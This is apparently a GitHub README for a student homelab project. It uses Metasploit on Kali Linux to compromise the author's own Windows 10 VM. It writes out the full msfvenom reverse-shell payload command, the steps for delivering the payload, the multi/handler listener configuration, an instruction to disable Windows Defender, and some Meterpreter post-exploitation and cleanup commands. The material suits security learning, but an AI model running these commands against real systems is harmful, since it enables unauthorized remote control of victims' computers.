# Kali-Metasploit-Project-Homelab

# Metasploit Penetration Testing Project

## 📌 Overview
For my project I demonstrated the use of **Metasploit Framework** to exploit a **Windows 10 VM** using a **Kali Linux VM** as the attacker. It covers the full penetration testing process, from setting up the environment to executing post-exploitation techniques.

⚠️ **Disclaimer:** This project is for educational and ethical hacking purposes only. Unauthorized access to computer systems is illegal. Always obtain permission before testing.

## 📸 Screenshots of My Metasploit Project

### 1️⃣ Kali Linux Attacking the Windows 10 VM|Successful Exploit Session: 
https://github.com/AndreeSalvo/Kali-Metasploit-Project-Homelab/blob/main/Kali%20Linux%20Attacking%20the%20Windows%2010%20VM%20Successful%20Exploit%20Session.png?raw=true 

### 2️⃣ Windows 10 Target VM|File explorer w/ the payload:
https://github.com/AndreeSalvo/Kali-Metasploit-Project-Homelab/blob/main/Payload%20into%20the%20file%20explorer.png?raw=true

### 3️⃣ Windows 10 Target VM|CMD prompt executed payload:
https://github.com/AndreeSalvo/Kali-Metasploit-Project-Homelab/blob/main/Executed%20the%20payload.png?raw=true


---

## 🔧 Installation & Setup

### **1️⃣ Install VMware Workstation Pro**
- Download and install VMware Workstation Pro from [VMware’s official site](https://www.vmware.com/products/workstation-pro.html).

### **2️⃣ Set Up Virtual Machines**
#### **Kali Linux VM (Attacker)**
- Download the latest **Kali Linux** ISO from [Kali’s official website](https://www.kali.org/).
- Install Kali on VMware and ensure **Metasploit Framework** is installed:
  ```bash
  sudo apt update && sudo apt install metasploit-framework -y

Windows 10 VM (Target)
- Install a Windows 10 virtual machine.
- Disable Windows Defender to prevent automatic deletion of the payload.

3️⃣ Configure Network Settings
I used the Bridged Adapter for both VMs to allow network communication.
Check IP addresses:
ip a   # On Kali
ipconfig   # On Windows (Command Prompt)

🎯 Exploitation Steps
1️⃣ Generate Payload (Malicious Executable)
Run the following msfvenom command on Kali to create a reverse shell payload:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your_Kali_IP> LPORT=4444 -f exe > payload.exe

2️⃣ Transfer Payload to Windows 10
Use a USB drive:
- sudo cp payload.exe /media/kali/USB_NAME/
- python3 -m http.server 8080
- http://<Your_Kali_IP>:8080/payload.exe

3️⃣ Start the Metasploit Listener
Launch Metasploit and set up the exploit:
msfconsole #start metasploit
- use exploit/multi/handler
- set payload windows/meterpreter/reverse_tcp
- set LHOST <Your_Kali_IP>
- set LPORT 4444
- exploit

4️⃣ Execute Payload on Windows
Run payload.exe on Windows. If successful, Meterpreter will open:
meterpreter >

🔥 Post-Exploitation Techniques
Once inside Meterpreter, try these:

Check system info:
- sysinfo
- getuid
- screenshot

🛑 Cleanup & Exit
To remove traces and exit:
- rm C:\\Users\\Public\\payload.exe
- exit
- sessions -K

⚖️ Legal & Ethical Considerations
This project is intended for educational purposes only. Unauthorized penetration testing is illegal under the Computer Fraud and Abuse Act (CFAA). Only perform tests in authorized environments with explicit permission.

I hacked a windows 10 vm on my personal Virtual Machine! so if you plan on doing this, please be responisble! 

Always hack responsibly! 🚀

📜 License
This project is released under the MIT License. You are free to use, modify, and distribute it for educational purposes.
